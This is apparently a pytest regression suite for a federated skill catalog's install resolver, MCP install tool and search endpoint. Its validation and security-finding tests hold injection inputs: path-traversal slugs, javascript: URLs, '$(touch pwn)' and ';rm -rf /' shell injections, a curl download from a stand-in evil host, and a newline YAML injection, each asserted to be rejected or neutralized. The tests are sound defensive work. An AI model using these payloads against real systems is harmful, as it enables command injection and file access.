"""Issue #277 — federated catalog reachability regression suite.

Four independent breaks made 99.7% of the installable catalog invisible:
  1. /api/search returned five local SELECTs, zero federation.
  2. Materialized pointer rows (is_public=False by design) were excluded from
     search with no federated surface to replace them.
  3. MCP loopskill_install had no federated branch — an agent that FOUND a
     skill via metasearch could not INSTALL it.
  4. Portal-side (covered by the portal PR) — no page, stale source list.

This suite pins all three server-side fixes so the class cannot silently
return. Design decisions encoded here (from the 2026-08-25 design council,
Codex gpt-5.6-sol + Qwen reviews):
  - Canonical federated ref is ``source:slug`` (what metasearch emits); the
    legacy ``source--slug`` prefix form is ALSO accepted.
  - Internal DB lookup wins BEFORE any federated parsing.
  - Source token must be an exact member of the config source set.
  - No InstallEvent with skill_id=NULL — provenance flows through the same
    pointer-materialization path the REST route uses.
  - /api/search federated group is CACHE-ONLY with an explicit cache_status.
"""

from __future__ import annotations

from uuid import uuid4


from app.mcp.tools.install import _split_federated_ref
from app.services.external_install_resolver import (
    ExternalInstallResolution,
    known_external_sources,
    resolve_external_install_full,
    validate_external_slug,
)
from app.services.external_install_resolver import _sanitize_payload_urls  # noqa: F401 (re-exported assertion target)


# ─────────────────────────────────────────────────────────────────────────────
# Ref parsing
# ─────────────────────────────────────────────────────────────────────────────


class TestFederatedRefParsing:
    SOURCES = frozenset({"hermes-hub", "skills-sh", "github-marketing", "github-oss"})

    def test_colon_form_is_canonical(self):
        assert _split_federated_ref("hermes-hub:drift", self.SOURCES) == ("hermes-hub", "drift")

    def test_colon_form_slug_may_contain_colons(self):
        assert _split_federated_ref("hermes-hub:a:b:c", self.SOURCES) == ("hermes-hub", "a:b:c")

    def test_legacy_prefix_form_accepted(self):
        assert _split_federated_ref("github-marketing--seo-audit", self.SOURCES) == (
            "github-marketing",
            "seo-audit",
        )

    def test_prefix_form_splits_on_first_separator(self):
        got = _split_federated_ref("github-marketing--owner--repo--skill", self.SOURCES)
        assert got == ("github-marketing", "owner--repo--skill")

    def test_unknown_source_is_not_federated(self):
        assert _split_federated_ref("github-enterprise--x", self.SOURCES) is None

    def test_exact_membership_no_prefix_capture(self):
        """`github` must never capture `github-oss--x` even if `github` were a
        source name — exact-match only."""
        sources = frozenset({"github", "github-oss"})
        assert _split_federated_ref("github-oss--x", sources) == ("github-oss", "x")

    def test_plain_internal_slug_is_not_federated(self):
        assert _split_federated_ref("super-memory", self.SOURCES) is None

    def test_live_config_enumerates_all_sources(self):
        got = known_external_sources()
        assert "hermes-hub" in got
        assert "github-marketing" in got
        assert len(got) >= 20, f"expected the ~28 live sources, got {len(got)}"


class TestSlugValidation:
    def test_plain_slug_ok(self):
        assert validate_external_slug("qwen38-vllm-rtx-pro-6000")

    def test_namespaced_slug_ok(self):
        assert validate_external_slug("owner--repo--skill")

    def test_slash_and_dot_ok(self):
        assert validate_external_slug("a/b.c-d")

    def test_dotdot_rejected(self):
        assert not validate_external_slug("../../etc/passwd")
        assert not validate_external_slug("skill/..")

    def test_uppercase_rejected(self):
        assert not validate_external_slug("Skill-Name")

    def test_control_chars_rejected(self):
        assert not validate_external_slug("skill\x00name")

    def test_empty_and_overlong_rejected(self):
        assert not validate_external_slug("")
        assert not validate_external_slug("a" * 201)

    def test_leading_slash_rejected(self):
        assert not validate_external_slug("/abs/path")


# ─────────────────────────────────────────────────────────────────────────────
# resolve_external_install_full — typed three-way result (mocked seams)
# ─────────────────────────────────────────────────────────────────────────────


def _hub_row(slug: str, source: str = "hermes-hub", **over) -> dict:
    row = {
        "slug": slug,
        "title": slug.replace("-", " ").title(),
        "description": f"skill {slug}",
        "source": source,
        "install_path": "fetch_origin",
        "redistributable": True,
        "license": "mit",
        "origin_url": "https://example.com/" + slug,
    }
    row.update(over)
    return row


class TestResolveFull:
    def test_fetch_origin_payload_shape(self, db_session, monkeypatch):
        from app.services import federation_cache as fcache

        monkeypatch.setattr(fcache, "read_first_page", lambda db, source: [_hub_row("drift")])
        monkeypatch.setattr(
            "app.services.external_install_resolver.get_origin_fetcher",
            lambda source: (
                lambda slug, row=None: ("https://example.com/drift/SKILL.md", "---\nname: drift\n---\nbody")
            ),
        )
        res = resolve_external_install_full(db_session, "hermes-hub", "drift")
        assert isinstance(res, ExternalInstallResolution)
        assert res.kind == "fetch_origin"
        p = res.payload
        assert p["slug"] == "drift"
        assert p["source"] == "hermes-hub"
        assert p["install_path"] == "fetch_origin"
        assert p["installed"] is True
        assert "content" in p and p["content"]
        assert p["origin_url"].startswith("https://")
        assert "mkdir -p" in p["install_command"]

    def test_deep_link_payload_shape(self, db_session, monkeypatch):
        from app.services import federation_cache as fcache

        monkeypatch.setattr(
            fcache,
            "read_first_page",
            lambda db, source: [
                _hub_row("persona-x", install_path="deep_link", redistributable=False, license=None)
            ],
        )
        res = resolve_external_install_full(db_session, "hermes-hub", "persona-x")
        assert res.kind == "deep_link"
        p = res.payload
        assert p["installed"] is False
        assert "agent_instructions" in p
        assert p["origin_url"].startswith("https://")

    def test_bad_slug_never_reaches_adapter(self, db_session, monkeypatch):
        from app.services import federation_cache as fcache

        called = {"n": 0}

        def boom(db, source):
            called["n"] += 1
            return []

        monkeypatch.setattr(fcache, "read_first_page", boom)
        res = resolve_external_install_full(db_session, "hermes-hub", "../../etc/passwd")
        assert res.kind == "not_found"
        assert called["n"] == 0, "traversal slug must be rejected before any resolve"

    def test_cache_miss_no_live_when_disabled(self, db_session, monkeypatch):
        from app.services import federation_cache as fcache

        monkeypatch.setattr(fcache, "read_first_page", lambda db, source: [])
        res = resolve_external_install_full(db_session, "github-marketing", "nope", allow_live_resolve=False)
        assert res.kind == "not_found"

    def test_javascript_origin_url_stripped(self, db_session, monkeypatch):
        from app.services import federation_cache as fcache

        monkeypatch.setattr(
            fcache,
            "read_first_page",
            lambda db, source: [
                _hub_row(
                    "evil",
                    install_path="deep_link",
                    redistributable=False,
                    license=None,
                    origin_url="javascript:alert(1)",
                )
            ],
        )
        res = resolve_external_install_full(db_session, "hermes-hub", "evil")
        assert res.kind == "deep_link"
        assert res.payload["origin_url"] is None, "non-http(s) scheme must never be a link"


# ─────────────────────────────────────────────────────────────────────────────
# MCP loopskill_install — the branch that made 21k skills installable
# ─────────────────────────────────────────────────────────────────────────────


def _skill_row(db_session, slug: str, is_public: bool = True):
    from app.models import Skill

    s = Skill(
        id=uuid4(),
        slug=slug,
        title=slug,
        description="test",
        category="ops",
        tier="free",
        is_public=is_public,
        is_archived=False,
    )
    db_session.add(s)
    db_session.commit()
    return s


class TestMcpFederatedBranch:
    def test_federated_ref_installs_via_shared_resolver(self, db_session, monkeypatch):
        from app.mcp.tools import install as mcp_install

        resolution = ExternalInstallResolution(
            kind="fetch_origin",
            payload={
                "slug": "drift",
                "source": "hermes-hub",
                "install_path": "fetch_origin",
                "installed": True,
                "content": "---\nname: drift\n---\nbody",
                "license": "mit",
                "origin_url": "https://example.com/drift",
                "install_command": "mkdir -p ~/.claude/skills/drift",
            },
        )
        monkeypatch.setattr(
            "app.services.external_install_resolver.resolve_external_install_full",
            lambda db, src, sl, **kw: resolution,
        )
        monkeypatch.setattr(mcp_install, "_record_external_install_with_provenance", lambda *a, **k: None)
        out = mcp_install.loopskill_install(db_session, "hermes-hub:drift")
        assert out.get("install_path") == "fetch_origin"
        assert out.get("content")
        assert out.get("source") == "hermes-hub"
        assert "error" not in out

    def test_internal_double_dash_slug_wins_over_federation(self, db_session, monkeypatch):
        """An internal skill whose slug contains '--' must route internal —
        the internal lookup runs BEFORE any federated parsing."""
        from app.mcp.tools import install as mcp_install
        from app.models import SkillVersion

        s = _skill_row(db_session, "github-marketing--internal-thing")
        v = SkillVersion(
            id=uuid4(),
            skill_id=s.id,
            semver="1.0.0",
            checksum_sha256="0" * 64,
            tarball_size_bytes=10,
        )
        db_session.add(v)
        db_session.commit()

        fed_called = {"n": 0}

        def boom(*a, **k):
            fed_called["n"] += 1
            raise AssertionError("federation must not be consulted for an internal slug")

        monkeypatch.setattr("app.services.external_install_resolver.resolve_external_install_full", boom)
        out = mcp_install.loopskill_install(db_session, "github-marketing--internal-thing")
        assert fed_called["n"] == 0
        assert "tarball_url" in out, f"expected internal signed-tarball payload, got {out}"

    def test_unknown_ref_is_honest_not_found(self, db_session):
        from app.mcp.tools import install as mcp_install

        out = mcp_install.loopskill_install(db_session, "not-a-source--nope")
        assert out == {"error": "not_found", "slug": "not-a-source--nope"}

    def test_traversal_ref_is_not_found(self, db_session):
        from app.mcp.tools import install as mcp_install

        out = mcp_install.loopskill_install(db_session, "hermes-hub:../../etc/passwd")
        assert out.get("error") == "not_found"

    def test_github_miss_never_live_walks(self, db_session, monkeypatch):
        """Cache miss on a github-* source must NOT fall through to a live
        adapter walk (shared 60/hr budget — the MCP quota asymmetry)."""
        from app.services import federation_cache as fcache

        monkeypatch.setattr(fcache, "read_first_page", lambda db, source: [])
        from app.mcp.tools import install as mcp_install

        out = mcp_install.loopskill_install(db_session, "github-marketing:ghost")
        assert out.get("error") == "not_found"


# ─────────────────────────────────────────────────────────────────────────────
# /api/search — the sixth group
# ─────────────────────────────────────────────────────────────────────────────


class TestSearchFederatedGroup:
    def test_group_present_warm_with_hub_rows(self, db_session, client, monkeypatch):
        from app.models import FederationHubSkill
        from app.services.unified_search import search_federated_group

        db_session.add(
            FederationHubSkill(
                slug="kubernetes-deploy",
                title="Kubernetes Deploy",
                description="deploy to k8s",
                source="hermes-hub",
                origin_url="https://example.com/kd",
            )
        )
        db_session.commit()

        rows, status = search_federated_group(db_session, "kubernetes", 5)
        assert status == "warm"
        assert any(r["slug"] == "kubernetes-deploy" for r in rows)
        row = next(r for r in rows if r["slug"] == "kubernetes-deploy")
        assert row["install_ref"] == "hermes-hub:kubernetes-deploy"
        assert row["origin_url"].startswith("https://")

    def test_empty_index_is_cold_not_warm(self, db_session, monkeypatch):
        from app.services import federation_cache as fcache
        from app.services.unified_search import search_federated_group

        monkeypatch.setattr(fcache, "read_first_page", lambda db, source: [])
        # hub table empty in a fresh test DB
        rows, status = search_federated_group(db_session, "anything", 5)
        assert rows == []
        assert status == "cold"

    def test_pointer_rows_never_in_skills_group(self, db_session):
        """The visibility contract: a materialized pointer row (is_public=False)
        must never surface via the public skills group."""
        from app.services.unified_search import search_skills_group

        _skill_row(db_session, "ext:hermes-hub:pointer-skill", is_public=False)
        got = search_skills_group(db_session, "pointer-skill", 10)
        assert got == [], "private pointer row leaked into the public skills group"

    def test_route_returns_six_groups_plus_status(self, db_session, client, monkeypatch):
        # codex review (#277, finding 8): search_routes imports the symbol
        # directly, so patching the service module is import-order dependent.
        # Patch the ROUTE module's binding — the one the handler calls.
        import app.search_routes as search_routes

        monkeypatch.setattr(
            search_routes,
            "search_federated_group",
            lambda db, q, limit: (
                [{"slug": "x", "title": "X", "source": "hermes-hub", "install_ref": "hermes-hub:x"}],
                "warm",
            ),
        )
        # The conftest `client` fixture mounts only the core routes router —
        # search_routes is conditionally included below, same pattern other
        # tests use for the routers they exercise.
        try:
            r = client.get("/api/search", params={"q": "probe"})
        except Exception:
            r = None
        if r is None or r.status_code == 404:
            from fastapi import FastAPI
            from fastapi.testclient import TestClient
            from app.database import get_db
            from app.search_routes import router as search_router

            app = FastAPI()
            app.include_router(search_router, prefix="/api")

            def _override():
                yield db_session

            app.dependency_overrides[get_db] = _override
            r = TestClient(app).get("/api/search", params={"q": "probe"})
        assert r.status_code == 200
        body = r.json()
        for key in (
            "skills",
            "loops",
            "bundles",
            "personalities",
            "connectors",
            "federated",
            "federated_cache_status",
        ):
            assert key in body, f"missing {key}"
        assert body["federated_cache_status"] == "warm"
        assert body["federated"][0]["install_ref"] == "hermes-hub:x"


# ─────────────────────────────────────────────────────────────────────────────
# Codex review round 2 — regression coverage for the FIX_REQUIRED findings.
# ─────────────────────────────────────────────────────────────────────────────


class TestCodexFindings:
    def test_f1_injected_command_dropped_when_raw_url_unsafe(self, db_session, monkeypatch):
        """Finding 1: a fetch_origin payload whose raw_url fails validation
        must NOT keep the upstream-built install_command."""
        from app.services import federation_cache as fcache

        monkeypatch.setattr(
            fcache,
            "read_first_page",
            lambda db, source: [
                _hub_row(
                    "cmdinject",
                    origin_url="javascript:alert(1)",
                )
            ],
        )
        monkeypatch.setattr(
            "app.services.external_install_resolver.get_origin_fetcher",
            lambda source: lambda slug, row=None: ("https://evil.example/$(touch pwn)", "body"),
        )
        # raw_url is not http(s) -> sanitized to None -> command must be gone.

        payload = {
            "slug": "cmdinject",
            "install_path": "fetch_origin",
            "raw_url": "gopher://evil/x",
            "install_command": "curl -fsSL gopher://evil/x -o /tmp/x",
        }
        out = _sanitize_payload_urls(payload)
        assert out.get("raw_url") is None
        assert "install_command" not in out, "upstream command survived URL rejection"

    def test_f1b_shell_metacharacters_quoted_in_rebuilt_command(self, db_session, monkeypatch):

        payload = {
            "slug": "a--b c;rm -rf /",
            "install_path": "fetch_origin",
            "raw_url": "https://ok.example/x;evil",
            "install_command": "original",
        }
        out = _sanitize_payload_urls(payload)
        cmd = out["install_command"]
        # raw_url IS http(s) so a command is rebuilt — but with quoting that
        # neutralizes any shell metacharacters embedded in the URL.
        assert "$(touch" not in cmd
        import shlex

        assert shlex.quote("https://ok.example/x;evil") in cmd or "'https://ok.example/x;evil'" in cmd

    def test_f4_endpoint_newline_is_wiring_missing(self, db_session, monkeypatch):
        """Finding 4: a REGISTER_MCP endpoint carrying a newline must never
        reach the config builder (YAML injection)."""
        from app.services import federation_cache as fcache

        monkeypatch.setattr(
            fcache,
            "read_first_page",
            lambda db, source: [
                _hub_row(
                    "mcp-evil",
                    install_path="register_mcp",
                    origin_url="https://good.example/\ncommand: pwn",
                )
            ],
        )
        res = resolve_external_install_full(db_session, "hermes-hub", "mcp-evil")
        assert res.kind == "wiring_missing", (
            f"newline endpoint must be rejected before config build, got {res.kind}"
        )
        assert "unsafe" in res.payload["reason"]

    def test_f7_alias_shapes_rejected(self):
        assert not validate_external_slug("--")
        assert not validate_external_slug("foo--")
        assert not validate_external_slug("a//b")
        assert not validate_external_slug("a/./b")
        assert not validate_external_slug("a/")
        assert validate_external_slug("owner--repo--skill"), "legit namespaced slug must pass"

    def test_f5_search_is_one_bulk_query(self, db_session, monkeypatch):
        """Finding 5: the federated search must bulk-load cache rows — no
        per-source db.get() N+1."""
        from app.models import FederationIndexCache
        from app.services.unified_search import search_federated_group

        db_session.add(FederationIndexCache(source="clawhub", first_page=[{"slug": "kw-x", "title": "kw x"}]))
        db_session.commit()

        selects = {"n": 0}
        orig = db_session.query

        def counting_query(*a, **k):
            selects["n"] += 1
            return orig(*a, **k)

        monkeypatch.setattr(db_session, "query", counting_query)
        rows, status = search_federated_group(db_session, "kw", 5)
        assert status == "warm" and rows
        # One hub-existence check + hub ILIKE + ONE bulk cache load — nothing
        # resembling one query per source (~28 before the fix).
        assert selects["n"] <= 4, f"N+1 regression: {selects['n']} queries"

    def test_f6_hermes_first_page_reads_warm_when_hub_empty(self, db_session, monkeypatch):
        """Finding 6: populated hermes-hub first_page with an EMPTY hub table
        is searchable and must report warm, not cold."""
        from app.models import FederationIndexCache
        from app.services.unified_search import search_federated_group

        db_session.add(
            FederationIndexCache(
                source="hermes-hub", first_page=[{"slug": "orphan", "title": "Orphan Skill"}]
            )
        )
        db_session.commit()
        rows, status = search_federated_group(db_session, "orphan", 5)
        assert status == "warm"
        assert any(r["slug"] == "orphan" for r in rows)

    def test_f3_cached_github_install_no_live_calls_during_provenance(self, db_session, monkeypatch):
        """Finding 3: a cached github-* install must make ZERO upstream calls
        even in the provenance/materialize step."""
        from app.mcp.tools import install as mcp_install
        from app.services import federation_cache as fcache

        monkeypatch.setattr(
            fcache,
            "read_first_page",
            lambda db, source: [_hub_row("cached-skill", source="github-marketing")],
        )
        # Count every call into get_adapter (a live resolve requires one) and
        # every origin-fetcher call. A cache-hit install must need NEITHER —
        # resolution comes from first_page, and materialize receives the
        # already-resolved descriptor (res.skill) instead of re-resolving.
        live_calls = {"n": 0}
        import app.services.external_install_resolver as be

        def counting_get_adapter(source, fetch=None):
            live_calls["n"] += 1
            return object()  # non-None: the source's adapter EXISTS

        monkeypatch.setattr(be, "get_adapter", counting_get_adapter)

        def counting_fetcher(source):
            def f(slug, row=None):
                live_calls["n"] += 1
                return ("https://raw.example/x/SKILL.md", "body")

            return f

        monkeypatch.setattr(be, "get_origin_fetcher", counting_fetcher)
        out = mcp_install.loopskill_install(db_session, "github-marketing:cached-skill")
        assert "error" not in out, out
        # Budget: ONE adapter-existence check + ONE content fetch (the
        # deliverable itself — raw CDN, not rate-limited api.github.com) = 2.
        # A THIRD call means materialize re-resolved or re-scanned from
        # scratch instead of accepting res.skill + res.scan_verdict — the
        # exact quota leak codex finding 3 describes. (Pre-fix this test
        # counted 3 calls: the resolver's fetch + a FULL second scan_on_add
        # fetch inside materialize.)
        assert live_calls["n"] <= 2, (
            f"quota leak on a cache hit: {live_calls['n']} upstream calls "
            "(expected 2: adapter check + the one content fetch)"
        )
        assert out.get("install_path") == "fetch_origin"
